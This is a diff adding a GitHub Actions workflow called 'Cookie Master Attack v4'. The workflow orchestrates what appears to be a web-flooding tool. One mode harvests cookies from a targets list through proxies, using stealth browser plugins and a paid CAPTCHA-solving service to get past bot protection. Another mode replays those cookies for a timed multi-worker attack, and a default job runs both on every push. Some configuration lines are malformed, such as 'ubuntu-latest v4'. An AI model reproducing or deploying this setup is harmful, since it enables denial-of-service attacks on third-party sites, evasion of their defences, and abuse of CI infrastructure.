@@ -1,0 +1,121 @@
+name: Cookie Master Attack v4
+
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'Operation mode: keymaster or attack'
+        required: true
+        type: string
+        default: 'keymaster'
+      targets_file:
+        description: 'Targets file name'
+        required: true
+        type: string
+        default: 'targets.txt'
+      proxies_file:
+        description: 'Proxies file name'
+        required: true
+        type: string
+        default: 'proxy.txt'
+      cookies_file:
+        description: 'Cookies file name'
+        required: true
+        type: string
+        default: 'cookies.json'
+      duration:
+        description: 'Attack duration in seconds'
+        required: true
+        type: number
+        default: 300
+      workers:
+        description: 'Number of workers'
+        required: true
+        type: number
+        default: 4
+  push:
+    branches: [ main ]
+
+jobs:
+  keymaster:
+    runs-on: ubuntu-latest v4
+    if: ${{ github.event_name == 'workflow_dispatch' && inputs.mode == 'keymaster' }}
+    
+    steps:
+    - name: Checkout code v4
+      uses: actions/checkout@v4
+      
+    - name: Setup Node.js v4
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        
+    - name: Install dependencies v4
+      run: |
+        npm install puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-recaptcha puppeteer-cluster undici
+        
+    - name: Run Cookie Master keymaster v4
+      run: |
+        node cookie_master.js --keymaster ${{ inputs.targets_file }} ${{ inputs.proxies_file }} ${{ inputs.cookies_file }}
+      env:
+        YOUR_2CAPTCHA_API_KEY: ${{ secrets.CAPTCHA_API_KEY }}
+        
+    - name: Upload cookies file v4
+      uses: actions/upload-artifact@v3
+      with:
+        name: cookies-data
+        path: ${{ inputs.cookies_file }}
+
+  attack:
+    runs-on: ubuntu-latest v4
+    if: ${{ github.event_name == 'workflow_dispatch' && inputs.mode == 'attack' }}
+    
+    steps:
+    - name: Checkout code v4
+      uses: actions/checkout@v4
+      
+    - name: Setup Node.js v4
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        
+    - name: Install dependencies v4
+      run: |
+        npm install undici
+        
+    - name: Download cookies file v4
+      uses: actions/download-artifact@v3
+      with:
+        name: cookies-data
+        path: .
+        
+    - name: Run Cookie Master attack v4
+      run: |
+        node cookie_master.js ${{ inputs.cookies_file }} ${{ inputs.duration }} ${{ inputs.workers }}
+        
+  default_attack:
+    runs-on: ubuntu-latest v4
+    if: ${{ github.event_name != 'workflow_dispatch' }}
+    
+    steps:
+    - name: Checkout code v4
+      uses: actions/checkout@v4
+      
+    - name: Setup Node.js v4
+      uses: actions/setup-node@v4
+      with:
+        node-version: '18'
+        
+    - name: Install dependencies v4
+      run: |
+        npm install puppeteer-extra puppeteer-extra-plugin-stealth puppeteer-extra-plugin-recaptcha puppeteer-cluster undici
+        
+    - name: Run Cookie Master keymaster v4
+      run: |
+        node cookie_master.js --keymaster targets.txt proxy.txt cookies.json
+      env:
+        YOUR_2CAPTCHA_API_KEY: ${{ secrets.CAPTCHA_API_KEY }}
+        
+    - name: Run Cookie Master attack v4
+      run: |
+        node cookie_master.js cookies.json 300 4
